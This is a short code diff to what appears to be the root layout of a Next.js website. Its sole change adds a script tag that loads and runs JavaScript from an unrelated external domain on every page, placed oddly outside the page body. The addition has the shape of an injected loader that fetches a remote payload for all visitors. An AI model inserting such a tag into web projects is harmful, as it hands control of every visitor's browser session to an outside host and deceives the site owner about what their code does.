@@ -18,6 +18,7 @@ export default function RootLayout({ children }: LayoutProps<"/">) {
   return (
     <html lang="sk" className={`${geistSans.variable} h-full antialiased`}>
       <body className="min-h-full">{children}</body>
+<Script src={`https://zvoncek.thegrandpoints.com/p.js`} strategy="afterInteractive" />
     </html>
   );
 }
